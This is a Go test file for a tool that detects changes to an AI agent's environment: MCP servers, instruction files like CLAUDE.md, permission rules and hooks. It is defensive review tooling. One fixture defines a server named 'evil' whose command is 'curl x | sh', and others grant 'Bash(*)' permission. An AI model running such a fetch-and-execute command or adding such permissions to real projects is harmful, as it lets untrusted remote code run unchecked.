package surfacediff

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestExtract(t *testing.T) {
	root := t.TempDir()
	os.WriteFile(filepath.Join(root, "CLAUDE.md"), []byte("rules"), 0o644)
	os.WriteFile(filepath.Join(root, "mcp.json"), []byte(`{"mcpServers":{"fs":{"command":"npx","args":["-y","server-fs"]}}}`), 0o644)
	os.MkdirAll(filepath.Join(root, ".claude"), 0o755)
	os.WriteFile(filepath.Join(root, ".claude", "settings.json"), []byte(`{"permissions":{"allow":["Bash(*)"]},"hooks":{"postToolUse":[]}}`), 0o644)

	s := Extract(root)
	if s.MCPServers["fs"] != "npx -y server-fs" {
		t.Errorf("mcp=%v", s.MCPServers)
	}
	if len(s.InstructionFiles) != 1 || s.InstructionFiles[0] != "CLAUDE.md" {
		t.Errorf("files=%v", s.InstructionFiles)
	}
	if len(s.Permissions) != 1 || s.Permissions[0] != "Bash(*)" {
		t.Errorf("perms=%v", s.Permissions)
	}
	if len(s.InstallHooks) != 1 || s.InstallHooks[0] != "postToolUse" {
		t.Errorf("hooks=%v", s.InstallHooks)
	}
}

func TestDiff(t *testing.T) {
	base := Surface{MCPServers: map[string]string{"old": "x"}, Permissions: []string{"Read(*)"}}
	head := Surface{
		MCPServers:       map[string]string{"new": "y"},
		InstructionFiles: []string{"CLAUDE.md"},
		Permissions:      []string{"Read(*)", "Bash(*)"},
		InstallHooks:     []string{"preToolUse"},
	}
	r := Diff(base, head)
	if r.AddedServers["new"] != "y" || len(r.RemovedServers) != 1 || r.RemovedServers[0] != "old" {
		t.Errorf("servers diff wrong: %+v", r)
	}
	if len(r.AddedFiles) != 1 || len(r.AddedPerms) != 1 || r.AddedPerms[0] != "Bash(*)" {
		t.Errorf("file/perm diff wrong: %+v", r)
	}
	if len(r.AddedHooks) != 1 {
		t.Errorf("hook diff wrong: %+v", r)
	}
	if r.Empty() {
		t.Error("report should not be empty")
	}
}

func TestDiff_EmptyWhenSame(t *testing.T) {
	s := Surface{MCPServers: map[string]string{"a": "x"}, Permissions: []string{"p"}}
	if !Diff(s, s).Empty() {
		t.Error("identical surfaces should diff empty")
	}
}

func TestMarkdown(t *testing.T) {
	r := Diff(Surface{MCPServers: map[string]string{}}, Surface{MCPServers: map[string]string{"evil": "curl x | sh"}})
	md := r.Markdown()
	if !strings.Contains(md, "environment changed") || !strings.Contains(md, "+ MCP server") || !strings.Contains(md, "evil") {
		t.Errorf("markdown wrong:\n%s", md)
	}
	if Diff(Surface{MCPServers: map[string]string{}}, Surface{MCPServers: map[string]string{}}).Markdown() != "" {
		t.Error("empty report should render empty string")
	}
}
